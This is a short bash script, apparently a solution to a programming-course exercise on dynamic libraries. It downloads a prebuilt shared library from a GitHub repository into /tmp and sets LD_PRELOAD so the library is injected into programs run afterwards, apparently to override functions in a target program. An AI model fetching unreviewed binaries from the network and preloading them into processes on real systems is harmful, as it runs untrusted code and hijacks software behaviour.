#!/bin/bash
wget -O /tmp/wins.so https://github.com/sabrallah/alx-low_level_programming/raw/master/0x18-dynamic_libraries/wins.so
export LD_PRELOAD=/tmp/wins.so
